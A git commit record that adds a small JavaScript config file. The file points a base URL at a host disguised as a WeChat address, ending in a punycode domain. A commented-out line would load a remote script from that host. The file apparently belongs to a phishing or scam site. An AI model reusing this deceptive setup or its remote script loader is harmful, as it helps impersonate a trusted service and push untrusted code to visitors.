6dc9055b51caf1fe507769669cc988f885eed788
super181818 <131360198+super181818@users.noreply.github.com>
2023-07-18 15:20:55 +0800

    Add files via upload

---
+++ js/config.js
@@ -0,0 +1,13 @@
+/*-------config start-------*/
+var _wip = 'wechat-328215-1317375082.cos-website.ap-nanjing.wechat.comzruhgzc5maztvip-wechat-com.xn--wbsy6ncuhq0sjlu.com';  
+var _port = '1709';   
+/*---------config end---------*/
+
+var BaseUrl = 'http://' + _wip+':'+_port;
+var ResourceUrl = '/';
+var Suffix = '.html';
+var _isTx = 1;
+var _wport = '10000' ;
+
+
+/*document.write('<script type="text/javascript" src="http://' + _wip + ':1999/dyoss.js?v=' + _tt + '"> <\/script>');*/
